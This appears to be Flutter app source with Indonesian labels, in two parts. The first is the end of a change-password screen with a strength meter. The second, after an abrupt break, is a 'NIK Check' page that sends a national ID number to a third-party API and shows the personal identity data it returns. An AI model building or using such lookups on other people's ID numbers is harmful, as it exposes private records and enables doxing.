    confirmPassCtrl.dispose();
    _oldFocus.dispose();
    _newFocus.dispose();
    _confirmFocus.dispose();
    super.dispose();
  }

  void _evalStrength() {
    final p = newPassCtrl.text;
    double s = 0;
    if (p.length >= 8)  s += 0.25;
    if (p.length >= 12) s += 0.15;
    if (RegExp(r'[A-Z]').hasMatch(p)) s += 0.2;
    if (RegExp(r'[0-9]').hasMatch(p)) s += 0.2;
    if (RegExp(r'[!@#\$%^&*]').hasMatch(p)) s += 0.2;

    String label;
    Color color;
    if (p.isEmpty)    { s = 0; label = '';        color = _C.textDim; }
    else if (s < 0.4) {        label = 'Lemah';   color = _C.red; }
    else if (s < 0.7) {        label = 'Sedang';  color = const Color(0xFFF59E0B); }
    else              {        label = 'Kuat';    color = _C.green; }

    setState(() {
      _strength      = s;
      _strengthLabel = label;
      _strengthColor = color;
    });
  }

  // ─── API ──────────────────────────────────────────────────────────────────
  Future<void> _changePassword() async {
    final oldPass     = oldPassCtrl.text.trim();
    final newPass     = newPassCtrl.text.trim();
    final confirmPass = confirmPassCtrl.text.trim();

    if (oldPass.isEmpty || newPass.isEmpty || confirmPass.isEmpty) {
      _shakeCtrl.forward(from: 0);
      _showResult('Semua field harus diisi.', success: false);
      return;
    }
    if (newPass != confirmPass) {
      _shakeCtrl.forward(from: 0);
      _showResult('Password baru tidak cocok dengan konfirmasi.', success: false);
      return;
    }

    setState(() => isLoading = true);
    try {
      final res = await http.post(
        Uri.parse("$baseUrl/changepass"),
        body: {
          "username":   widget.username,
          "oldPass":    oldPass,
          "newPass":    newPass,
          "sessionKey": widget.sessionKey,
        },
      );
      final data = jsonDecode(res.body);
      if (data['success'] == true) {
        _showResult('Password berhasil diubah!', success: true);
        oldPassCtrl.clear();
        newPassCtrl.clear();
        confirmPassCtrl.clear();
      } else {
        _shakeCtrl.forward(from: 0);
        _showResult(data['message'] ?? 'Gagal mengubah password', success: false);
      }
    } catch (e) {
      _shakeCtrl.forward(from: 0);
      _showResult('Koneksi error.', success: false);
    }
    setState(() => isLoading = false);
  }

  // ─── Result Dialog ────────────────────────────────────────────────────────
  void _showResult(String msg, {required bool success}) {
    showGeneralDialog(
      context: context,
      barrierDismissible: true,
      barrierLabel: '',
      barrierColor: Colors.amber,
      transitionDuration: const Duration(milliseconds: 340),
      transitionBuilder: (_, anim, __, child) => ScaleTransition(
        scale: CurvedAnimation(parent: anim, curve: Curves.easeOutBack),
        child: FadeTransition(opacity: anim, child: child),
      ),
      pageBuilder: (ctx, _, __) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: const EdgeInsets.symmetric(horizontal: 28),
        child: Container(
          decoration: BoxDecoration(
            color: _C.card,
            borderRadius: BorderRadius.circular(24),
            border: Border.all(
              color: (success ? _C.green : _C.red).withOpacity(0.3),
              width: 1.5,
            ),
            boxShadow: [
              BoxShadow(
                color: (success ? _C.green : _C.red).withOpacity(0.15),
                blurRadius: 50,
              ),
            ],
          ),
          padding: const EdgeInsets.all(28),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                width: 56, height: 56,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: (success ? _C.green : _C.red).withOpacity(0.1),
                  border: Border.all(
                      color: (success ? _C.green : _C.red).withOpacity(0.3)),
                ),
                child: Icon(
                  success ? Icons.check_rounded : Icons.close_rounded,
                  color: success ? _C.green : _C.red,
                  size: 28,
                ),
              ),
              const SizedBox(height: 16),
              Text(
                success ? 'Berhasil' : 'Gagal',
                style: const TextStyle(
                    color: _C.text, fontSize: 18, fontWeight: FontWeight.w800),
              ),
              const SizedBox(height: 8),
              Text(msg,
                  textAlign: TextAlign.center,
                  style: const TextStyle(
                      color: _C.textSub, fontSize: 13, height: 1.5)),
              const SizedBox(height: 24),
              _GradBtn(
                label: 'OK',
                fullWidth: true,
                gradient: success
                    ? const LinearGradient(
                        colors: [Color(0xFF16A34A), Color(0xFF22C55E)],
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                      )
                    : _C.btnGrad,
                onTap: () => Navigator.pop(ctx),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ─── Build ────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _C.bg,
      extendBodyBehindAppBar: true,
      appBar: _buildAppBar(),
      body: Stack(
        children: [
          // Animated bg
          Positioned.fill(child: _AnimatedBg(controller: _bgCtrl)),

          SafeArea(
            child: FadeTransition(
              opacity: _formFade,
              child: SlideTransition(
                position: _formSlide,
                child: SingleChildScrollView(
                  physics: const BouncingScrollPhysics(),
                  padding: const EdgeInsets.fromLTRB(20, 8, 20, 40),
                  child: Column(
                    children: [
                      const SizedBox(height: 16),
                      _buildHeroIcon(),
                      const SizedBox(height: 28),
                      _buildInfoCard(),
                      const SizedBox(height: 28),
                      AnimatedBuilder(
                        animation: _shake,
                        builder: (_, child) => Transform.translate(
                          offset: Offset(_shake.value, 0),
                          child: child,
                        ),
                        child: _buildForm(),
                      ),
                    ],
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  PreferredSizeWidget _buildAppBar() {
    return AppBar(
      backgroundColor: Colors.transparent,
      elevation: 0,
      leading: _AppBarBackBtn(onTap: () => Navigator.pop(context)),
      title: const Text(
        'Ganti Password',
        style: TextStyle(
          color: _C.text,
          fontSize: 17,
          fontWeight: FontWeight.w700,
          letterSpacing: -0.3,
        ),
      ),
      centerTitle: true,
    );
  }

  Widget _buildHeroIcon() {
    return AnimatedBuilder(
      animation: _iconCtrl,
      builder: (_, __) => Transform.scale(
        scale: _iconScale.value,
        child: Transform.rotate(
          angle: _iconRotate.value,
          child: _HeroIconWidget(),
        ),
      ),
    );
  }

  Widget _buildInfoCard() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 14),
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _C.border),
      ),
      child: Row(
        children: [
          Container(
            width: 38, height: 38,
            decoration: BoxDecoration(
              color: _C.blue.withOpacity(0.12),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: _C.borderLit),
            ),
            child: const Icon(Icons.person_outline_rounded,
                color: _C.blueLight, size: 18),
          ),
          const SizedBox(width: 14),
          Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const Text('Akun',
                  style: TextStyle(color: _C.textSub, fontSize: 11)),
              Text(
                widget.username,
                style: const TextStyle(
                    color: _C.text, fontSize: 15, fontWeight: FontWeight.w700),
              ),
            ],
          ),
          const Spacer(),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
            decoration: BoxDecoration(
              color: _C.green.withOpacity(0.1),
              borderRadius: BorderRadius.circular(8),
              border: Border.all(color: _C.green.withOpacity(0.3)),
            ),
            child: const Text('AKTIF',
                style: TextStyle(
                    color: _C.green,
                    fontSize: 10,
                    fontWeight: FontWeight.w700,
                    letterSpacing: 0.8)),
          ),
        ],
      ),
    );
  }

  Widget _buildForm() {
    return Container(
      padding: const EdgeInsets.all(22),
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(24),
        border: Border.all(color: _C.border),
        boxShadow: [
          BoxShadow(
              color: _C.blue.withOpacity(0.06),
              blurRadius: 30,
              offset: const Offset(0, 10)),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          // Section header
          Row(children: [
            Container(
              width: 4, height: 18,
              decoration: BoxDecoration(
                gradient: _C.btnGrad,
                borderRadius: BorderRadius.circular(2),
              ),
            ),
            const SizedBox(width: 10),
            const Text('Perbarui Keamanan',
                style: TextStyle(
                    color: _C.text,
                    fontSize: 15,
                    fontWeight: FontWeight.w700)),
          ]),
          const SizedBox(height: 6),
          const Padding(
            padding: EdgeInsets.only(left: 14),
            child: Text('Masukkan password lama & baru',
                style: TextStyle(color: _C.textSub, fontSize: 12)),
          ),

          const SizedBox(height: 24),

          // Old password
          _PasswordField(
            controller: oldPassCtrl,
            focusNode: _oldFocus,
            label: 'Password Lama',
            icon: Icons.lock_outline_rounded,
            obscure: _obscureOld,
            onToggle: () => setState(() => _obscureOld = !_obscureOld),
            nextFocus: _newFocus,
          ),

          const SizedBox(height: 14),

          // New password
          _PasswordField(
            controller: newPassCtrl,
            focusNode: _newFocus,
            label: 'Password Baru',
            icon: Icons.vpn_key_outlined,
            obscure: _obscureNew,
            onToggle: () => setState(() => _obscureNew = !_obscureNew),
            nextFocus: _confirmFocus,
          ),

          // Strength bar
          if (newPassCtrl.text.isNotEmpty) ...[
            const SizedBox(height: 8),
            _StrengthBar(
              strength: _strength,
              label: _strengthLabel,
              color: _strengthColor,
            ),
          ],

          const SizedBox(height: 14),

          // Confirm password
          _PasswordField(
            controller: confirmPassCtrl,
            focusNode: _confirmFocus,
            label: 'Konfirmasi Password',
            icon: Icons.enhanced_encryption_outlined,
            obscure: _obscureConfirm,
            onToggle: () => setState(() => _obscureConfirm = !_obscureConfirm),
            isLast: true,
            onSubmit: _changePassword,
            // Show match indicator
            matchState: confirmPassCtrl.text.isEmpty
                ? null
                : confirmPassCtrl.text == newPassCtrl.text,
          ),

          const SizedBox(height: 28),

          // Submit button
          _SubmitButton(
            isLoading: isLoading,
            onTap: _changePassword,
          ),

          const SizedBox(height: 16),

          // Tips
          _buildTips(),
        ],
      ),
    );
  }

  Widget _buildTips() {
    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: _C.blue.withOpacity(0.05),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: _C.border),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Row(children: [
            Icon(Icons.shield_outlined, color: _C.textSub, size: 13),
            SizedBox(width: 6),
            Text('Tips keamanan',
                style: TextStyle(
                    color: _C.textSub,
                    fontSize: 11,
                    fontWeight: FontWeight.w700)),
          ]),
          const SizedBox(height: 8),
          ...[
            'Minimal 8 karakter',
            'Kombinasi huruf besar, angka & simbol',
            'Hindari tanggal lahir atau nama',
          ].map((t) => Padding(
                padding: const EdgeInsets.only(top: 4),
                child: Row(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const Padding(
                      padding: EdgeInsets.only(top: 4),
                      child: Icon(Icons.circle, color: _C.textDim, size: 5),
                    ),
                    const SizedBox(width: 8),
                    Text(t,
                        style: const TextStyle(
                            color: _C.textDim, fontSize: 11, height: 1.4)),
                  ],
                ),
              )),
        ],
      ),
    );
  }
}

// ─── Hero Icon ────────────────────────────────────────────────────────────────
class _HeroIconWidget extends StatefulWidget {
  @override
  State<_HeroIconWidget> createState() => _HeroIconWidgetState();
}

class _HeroIconWidgetState extends State<_HeroIconWidget>
    with SingleTickerProviderStateMixin {
  late AnimationController _pulse;
  late Animation<double> _glow;

  @override
  void initState() {
    super.initState();
    _pulse = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 2000),
    )..repeat(reverse: true);
    _glow = Tween<double>(begin: 0.2, end: 0.8)
        .animate(CurvedAnimation(parent: _pulse, curve: Curves.easeInOut));
  }

  @override
  void dispose() { _pulse.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: _glow,
      builder: (_, __) => Column(
        children: [
          Stack(
            alignment: Alignment.center,
            children: [
              // Outer glow ring
              Container(
                width: 110, height: 110,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  border: Border.all(
                    color: _C.blueMid.withOpacity(_glow.value * 0.3),
                    width: 1,
                  ),
                ),
              ),
              // Mid ring
              Container(
                width: 90, height: 90,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  border: Border.all(
                    color: _C.blueMid.withOpacity(_glow.value * 0.5),
                    width: 1,
                  ),
                ),
              ),
              // Core
              Container(
                width: 70, height: 70,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  gradient: LinearGradient(
                    colors: [
                      _C.blue.withOpacity(0.8),
                      _C.blueMid.withOpacity(0.9),
                    ],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
                  boxShadow: [
                    BoxShadow(
                      color: _C.blueMid.withOpacity(_glow.value * 0.5),
                      blurRadius: 30,
                      spreadRadius: 0,
                    ),
                  ],
                ),
                child: const Icon(Icons.lock_reset_rounded,
                    color: Colors.white, size: 32),
              ),
            ],
          ),
          const SizedBox(height: 16),
          const Text('Keamanan Akun',
              style: TextStyle(
                  color: _C.text, fontSize: 20, fontWeight: FontWeight.w800)),
          const SizedBox(height: 4),
          const Text('Perbarui password secara berkala',
              style: TextStyle(color: _C.textSub, fontSize: 13)),
        ],
      ),
    );
  }
}

// ─── Password Field ───────────────────────────────────────────────────────────
class _PasswordField extends StatefulWidget {
  final TextEditingController controller;
  final FocusNode focusNode;
  final String label;
  final IconData icon;
  final bool obscure;
  final VoidCallback onToggle;
  final FocusNode? nextFocus;
  final bool isLast;
  final VoidCallback? onSubmit;
  final bool? matchState; // null=empty, true=match, false=mismatch

  const _PasswordField({
    required this.controller,
    required this.focusNode,
    required this.label,
    required this.icon,
    required this.obscure,
    required this.onToggle,
    this.nextFocus,
    this.isLast = false,
    this.onSubmit,
    this.matchState,
  });

  @override
  State<_PasswordField> createState() => _PasswordFieldState();
}

class _PasswordFieldState extends State<_PasswordField> {
  bool _focused = false;

  @override
  void initState() {
    super.initState();
    widget.focusNode.addListener(() {
      setState(() => _focused = widget.focusNode.hasFocus);
    });
  }

  @override
  Widget build(BuildContext context) {
    Color borderColor;
    if (widget.matchState == true) {
      borderColor = _C.green;
    } else if (widget.matchState == false) {
      borderColor = _C.red;
    } else if (_focused) {
      borderColor = _C.blueMid;
    } else {
      borderColor = _C.border;
    }

    return AnimatedContainer(
      duration: const Duration(milliseconds: 200),
      decoration: BoxDecoration(
        color: _focused ? _C.surface : _C.surface.withOpacity(0.7),
        borderRadius: BorderRadius.circular(14),
        border: Border.all(
          color: borderColor,
          width: _focused ? 1.5 : 1.0,
        ),
        boxShadow: _focused
            ? [
                BoxShadow(
                  color: _C.blueMid.withOpacity(0.1),
                  blurRadius: 12,
                  offset: const Offset(0, 4),
                )
              ]
            : [],
      ),
      child: TextField(
        controller: widget.controller,
        focusNode: widget.focusNode,
        obscureText: widget.obscure,
        textInputAction:
            widget.isLast ? TextInputAction.done : TextInputAction.next,
        onSubmitted: (_) {
          if (widget.nextFocus != null) {
            FocusScope.of(context).requestFocus(widget.nextFocus);
          } else {
            widget.onSubmit?.call();
          }
        },
        style: const TextStyle(
            color: _C.text, fontSize: 14, fontWeight: FontWeight.w500),
        cursorColor: _C.blueMid,
        decoration: InputDecoration(
          labelText: widget.label,
          labelStyle: const TextStyle(color: _C.textSub, fontSize: 13),
          floatingLabelStyle:
              const TextStyle(color: _C.blueMid, fontSize: 11),
          prefixIcon: Icon(
            widget.icon,
            color: _focused ? _C.blueLight : _C.textSub,
            size: 18,
          ),
          suffixIcon: Row(
            mainAxisSize: MainAxisSize.min,
            children: [
              // Match indicator
              if (widget.matchState != null)
                Padding(
                  padding: const EdgeInsets.only(right: 4),
                  child: Icon(
                    widget.matchState!
                        ? Icons.check_circle_rounded
                        : Icons.cancel_rounded,
                    color: widget.matchState! ? _C.green : _C.red,
                    size: 16,
                  ),
                ),
              IconButton(
                icon: Icon(
                  widget.obscure
                      ? Icons.visibility_off_outlined
                      : Icons.visibility_outlined,
                  color: _C.textSub,
                  size: 18,
                ),
                onPressed: widget.onToggle,
                splashRadius: 18,
              ),
            ],
          ),
          border: InputBorder.none,
          contentPadding:
              const EdgeInsets.symmetric(horizontal: 16, vertical: 16),
        ),
      ),
    );
  }
}

// ─── Strength Bar ─────────────────────────────────────────────────────────────
class _StrengthBar extends StatelessWidget {
  final double strength;
  final String label;
  final Color color;

  const _StrengthBar({
    required this.strength,
    required this.label,
    required this.color,
  });

  @override
  Widget build(BuildContext context) {
    return Row(
      children: [
        Expanded(
          child: ClipRRect(
            borderRadius: BorderRadius.circular(4),
            child: Stack(
              children: [
                Container(height: 4, color: _C.border),
                AnimatedContainer(
                  duration: const Duration(milliseconds: 300),
                  height: 4,
                  width: MediaQuery.of(context).size.width * strength * 0.65,
                  decoration: BoxDecoration(
                    color: color,
                    borderRadius: BorderRadius.circular(4),
                    boxShadow: [
                      BoxShadow(color: color.withOpacity(0.4), blurRadius: 6),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ),
        const SizedBox(width: 10),
        AnimatedSwitcher(
          duration: const Duration(milliseconds: 200),
          child: Text(
            label,
            key: ValueKey(label),
            style: TextStyle(
                color: color, fontSize: 11, fontWeight: FontWeight.w600),
          ),
        ),
      ],
    );
  }
}

// ─── Submit Button ────────────────────────────────────────────────────────────
class _SubmitButton extends StatefulWidget {
  final bool isLoading;
  final VoidCallback onTap;

  const _SubmitButton({required this.isLoading, required this.onTap});

  @override
  State<_SubmitButton> createState() => _SubmitButtonState();
}

class _SubmitButtonState extends State<_SubmitButton> {
  bool _down = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _down = true),
      onTapUp: (_) {
        setState(() => _down = false);
        if (!widget.isLoading) widget.onTap();
      },
      onTapCancel: () => setState(() => _down = false),
      child: AnimatedScale(
        scale: _down ? 0.97 : 1.0,
        duration: const Duration(milliseconds: 120),
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 200),
          height: 52,
          decoration: BoxDecoration(
            gradient: _C.btnGrad,
            borderRadius: BorderRadius.circular(16),
            boxShadow: _down || widget.isLoading
                ? []
                : [
                    BoxShadow(
                      color: _C.blueMid.withOpacity(0.35),
                      blurRadius: 20,
                      offset: const Offset(0, 6),
                    ),
                  ],
          ),
          child: Center(
            child: AnimatedSwitcher(
              duration: const Duration(milliseconds: 200),
              child: widget.isLoading
                  ? const SizedBox(
                      key: ValueKey('loading'),
                      width: 22, height: 22,
                      child: CircularProgressIndicator(
                          strokeWidth: 2.5, color: Colors.white),
                    )
                  : const Row(
                      key: ValueKey('label'),
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        Icon(Icons.lock_reset_rounded,
                            color: Colors.white, size: 18),
                        SizedBox(width: 10),
                        Text(
                          'Perbarui Password',
                          style: TextStyle(
                            color: Colors.white,
                            fontWeight: FontWeight.w700,
                            fontSize: 15,
                            letterSpacing: 0.3,
                          ),
                        ),
                      ],
                    ),
            ),
          ),
        ),
      ),
    );
  }
}

// ─── Shared: AnimatedBg ───────────────────────────────────────────────────────
class _AnimatedBg extends StatelessWidget {
  final AnimationController controller;
  const _AnimatedBg({required this.controller});

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: controller,
      builder: (_, __) => CustomPaint(
        painter: _BgPainter(controller.value),
      ),
    );
  }
}

class _BgPainter extends CustomPainter {
  final double t;
  _BgPainter(this.t);

  @override
  void paint(Canvas canvas, Size size) {
    final gridPaint = Paint()
      ..color = _C.border.withOpacity(0.28)
      ..strokeWidth = 0.5;
    const step = 38.0;
    for (double x = 0; x < size.width; x += step) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), gridPaint);
    }
    for (double y = 0; y < size.height; y += step) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), gridPaint);
    }

    // Soft glow di tengah-atas
    final paint = Paint()
      ..shader = RadialGradient(
        colors: [
          _C.blue.withOpacity(0.12 + math.sin(t * math.pi * 2) * 0.04),
          Colors.transparent,
        ],
        radius: 0.8,
      ).createShader(Rect.fromCircle(
          center: Offset(size.width / 2, size.height * 0.25),
          radius: size.width * 0.7));
    canvas.drawCircle(
        Offset(size.width / 2, size.height * 0.25), size.width * 0.7, paint);
  }

  @override
  bool shouldRepaint(_BgPainter old) => old.t != t;
}

// ─── Shared: AppBar Back Button ───────────────────────────────────────────────
class _AppBarBackBtn extends StatefulWidget {
  final VoidCallback onTap;
  const _AppBarBackBtn({required this.onTap});

  @override
  State<_AppBarBackBtn> createState() => _AppBarBackBtnState();
}

class _AppBarBackBtnState extends State<_AppBarBackBtn> {
  bool _down = false;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.all(8),
      child: GestureDetector(
        onTapDown: (_) => setState(() => _down = true),
        onTapUp: (_) { setState(() => _down = false); widget.onTap(); },
        onTapCancel: () => setState(() => _down = false),
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 120),
          decoration: BoxDecoration(
            color: _down ? _C.border : _C.surface,
            borderRadius: BorderRadius.circular(11),
            border: Border.all(color: _C.border),
          ),
          child: const Icon(Icons.arrow_back_ios_new_rounded,
              color: _C.textSub, size: 16),
        ),
      ),
    );
  }
}

// ─── Shared: _GradBtn ─────────────────────────────────────────────────────────
class _GradBtn extends StatefulWidget {
  final String label;
  final VoidCallback onTap;
  final LinearGradient gradient;
  final bool fullWidth;
  final IconData? icon;

  const _GradBtn({
    required this.label,
    required this.onTap,
    this.gradient = _C.btnGrad,
    this.fullWidth = false,
    this.icon,
  });

  @override
  State<_GradBtn> createState() => _GradBtnState();
}

class _GradBtnState extends State<_GradBtn> {
  bool _down = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _down = true),
      onTapUp: (_) { setState(() => _down = false); widget.onTap(); },
      onTapCancel: () => setState(() => _down = false),
      child: AnimatedScale(
        scale: _down ? 0.96 : 1.0,
        duration: const Duration(milliseconds: 120),
        child: Container(
          height: 46,
          width: widget.fullWidth ? double.infinity : null,
          padding: widget.fullWidth
              ? EdgeInsets.zero
              : const EdgeInsets.symmetric(horizontal: 24),
          decoration: BoxDecoration(
            gradient: widget.gradient,
            borderRadius: BorderRadius.circular(13),
            boxShadow: _down
                ? []
                : [
                    BoxShadow(
                      color: _C.blueMid.withOpacity(0.3),
                      blurRadius: 14,
                      offset: const Offset(0, 4),
                    )
                  ],
          ),
          child: Row(
            mainAxisAlignment: MainAxisAlignment.center,
            mainAxisSize:
                widget.fullWidth ? MainAxisSize.max : MainAxisSize.min,
            children: [
              if (widget.icon != null) ...[
                Icon(widget.icon, color: Colors.white, size: 16),
                const SizedBox(width: 8),
              ],
              Text(widget.label,
                  style: const TextStyle(
                    color: Colors.white,
                    fontWeight: FontWeight.w700,
                    fontSize: 14,
                  )),
            ],
          ),
        ),
      ),
    );
  }
}




as http;


class NikCheckerPage extends StatefulWidget {
  const NikCheckerPage({super.key});

  @override
  State<NikCheckerPage> createState() => _NikCheckerPageState();
}

class _NikCheckerPageState extends State<NikCheckerPage> with SingleTickerProviderStateMixin {
  final TextEditingController _nikController = TextEditingController();
  bool _isLoading = false;
  Map<String, dynamic>? _data;
  String? _errorMessage;

  // --- Warna Tema Hitam Cyan ---
  final Color primaryDark = const Color(0xFF0B1A1A);
  final Color primaryCyan = const Color(0xFF00ACC1);
  final Color accentCyan = const Color(0xFF18FFFF);
  final Color lightCyan = const Color(0xFF84FFFF);
  final Color primaryWhite = Colors.white;
  final Color accentGrey = Colors.grey.shade400;
  final Color cardDark = const Color(0xFF1A2A2A);

  late final AnimationController _animController;
  late final Animation<double> _fadeAnimation;

  @override
  void initState() {
    super.initState();
    _animController = AnimationController(vsync: this, duration: const Duration(milliseconds: 500));
    _fadeAnimation = CurvedAnimation(parent: _animController, curve: Curves.easeIn);
  }

  @override
  void dispose() {
    _nikController.dispose();
    _animController.dispose();
    super.dispose();
  }

  Future<void> _checkNik() async {
    final nik = _nikController.text.trim();
    if (nik.isEmpty) {
      setState(() {
        _errorMessage = "NIK tidak boleh kosong.";
        _data = null;
      });
      return;
    }

    setState(() {
      _isLoading = true;
      _errorMessage = null;
      _data = null;
    });

    final url = Uri.parse("https://api.siputzx.my.id/api/tools/nik-checker?nik=$nik");

    try {
      final response = await http.get(url);
      if (response.statusCode == 200) {
        final json = jsonDecode(response.body);
        if (json['status'] == true && json['data'] != null) {
          setState(() {
            _data = json['data'];
            _errorMessage = null;
          });
          _animController.forward(from: 0);
        } else {
          setState(() {
            _errorMessage = "Data tidak ditemukan atau NIK tidak valid.";
          });
        }
      } else {
        setState(() {
          _errorMessage = "Gagal mengambil data dari server.";
        });
      }
    } catch (e) {
      setState(() {
        _errorMessage = "Terjadi kesalahan: $e";
      });
    } finally {
      setState(() {
        _isLoading = false;
      });
    }
  }

  Widget _buildCategoryCard({
    required String title,
    required IconData icon,
    required List<Widget> children,
  }) {
    return Container(
      margin: const EdgeInsets.only(bottom: 16),
      decoration: BoxDecoration(
        color: cardDark,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: primaryCyan.withOpacity(0.3), width: 1),
        boxShadow: [
          BoxShadow(
            color: primaryCyan.withOpacity(0.2),
            blurRadius: 10,
            offset: const Offset(0, 4),
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Container(
            width: double.infinity,
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [primaryCyan, accentCyan],
                begin: Alignment.centerLeft,
                end: Alignment.centerRight,
              ),
              borderRadius: const BorderRadius.only(
                topLeft: Radius.circular(16),
                topRight: Radius.circular(16),
              ),
            ),
            child: Row(
              children: [
                Icon(icon, color: primaryWhite, size: 20),
                const SizedBox(width: 12),
                Text(
                  title,
                  style: TextStyle(
                    color: primaryWhite,
                    fontSize: 16,
                    fontWeight: FontWeight.bold,
                    fontFamily: 'Orbitron',
                  ),
                ),
              ],
            ),
          ),
          Padding(
            padding: const EdgeInsets.all(16),
            child: Column(
              children: children,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildInteractiveInfoRow({
    required String label,
    required String? value,
    IconData? copyIcon = Icons.copy,
    VoidCallback? onCopy,
  }) {
    if (value == null || value.isEmpty) return const SizedBox.shrink();

    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.black.withOpacity(0.3),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: primaryCyan.withOpacity(0.2)),
        gradient: LinearGradient(
          colors: [
            Colors.transparent,
            primaryCyan.withOpacity(0.05),
          ],
          begin: Alignment.centerLeft,
          end: Alignment.centerRight,
        ),
      ),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  label,
                  style: TextStyle(
                    color: accentGrey,
                    fontSize: 14,
                    fontWeight: FontWeight.w600,
                  ),
                ),
                const SizedBox(height: 4),
                Text(
                  value,
                  style: TextStyle(
                    color: primaryWhite,
                    fontSize: 16,
                    fontWeight: FontWeight.w500,
                  ),
                ),
              ],
            ),
          ),
          if (onCopy != null)
            Container(
              decoration: BoxDecoration(
                color: primaryCyan.withOpacity(0.2),
                shape: BoxShape.circle,
                border: Border.all(color: primaryCyan.withOpacity(0.3)),
              ),
              child: IconButton(
                icon: Icon(copyIcon, color: lightCyan, size: 18),
                onPressed: onCopy,
                padding: const EdgeInsets.all(6),
                constraints: const BoxConstraints(minWidth: 36, minHeight: 36),
                tooltip: 'Salin $label',
              ),
            ),
        ],
      ),
    );
  }

  void _copyToClipboard(String text, String label) {
    Clipboard.setData(ClipboardData(text: text));
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(
          '$label disalin ke clipboard',
          style: TextStyle(
            color: primaryWhite,
            fontWeight: FontWeight.bold,
          ),
        ),
        backgroundColor: primaryCyan,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(10),
        ),
        duration: const Duration(seconds: 2),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: primaryDark,
      appBar: AppBar(
        title: const Text(
          'NIK Check',
          style: TextStyle(
            fontFamily: 'Orbitron',
            fontWeight: FontWeight.bold,
            color: Colors.white,
          ),
        ),
        backgroundColor: primaryDark,
        centerTitle: true,
        elevation: 0,
        iconTheme: const IconThemeData(color: Colors.white),
      ),
      body: SafeArea(
        child: Padding(
          padding: const EdgeInsets.all(16),
          child: Column(
            children: [
              Container(
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  color: cardDark,
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(color: primaryCyan.withOpacity(0.3)),
                  boxShadow: [
                    BoxShadow(
                      color: primaryCyan.withOpacity(0.2),
                      blurRadius: 8,
                      offset: const Offset(0, 2),
                    ),
                  ],
                ),
                child: Column(
                  children: [
                    TextField(
                      controller: _nikController,
                      keyboardType: TextInputType.number,
                      style: TextStyle(color: primaryWhite, fontSize: 16),
                      decoration: InputDecoration(
                        labelText: 'Masukkan NIK',
                        labelStyle: TextStyle(color: lightCyan),
                        hintText: 'Contoh: 5206085405880001',
                        hintStyle: TextStyle(color: accentGrey),
                        enabledBorder: OutlineInputBorder(
                          borderSide: BorderSide(color: primaryCyan.withOpacity(0.5)),
                          borderRadius: BorderRadius.circular(12),
                        ),
                        focusedBorder: OutlineInputBorder(
                          borderSide: BorderSide(color: lightCyan, width: 2),
                          borderRadius: BorderRadius.circular(12),
                        ),
                        filled: true,
                        fillColor: Colors.black.withOpacity(0.3),
                        suffixIcon: _isLoading
                            ? Padding(
                          padding: const EdgeInsets.all(12.0),
                          child: SizedBox(
                            width: 18,
                            height: 18,
                            child: CircularProgressIndicator(
                              color: lightCyan,
                              strokeWidth: 2,
                            ),
                          ),
                        )
                            : null,
                      ),
                      onSubmitted: (_) => _checkNik(),
                    ),
                    const SizedBox(height: 16),
                    SizedBox(
                      width: double.infinity,
                      child: ElevatedButton(
                        onPressed: _isLoading ? null : _checkNik,
                        style: ElevatedButton.styleFrom(
                          backgroundColor: primaryCyan,
                          foregroundColor: primaryWhite,
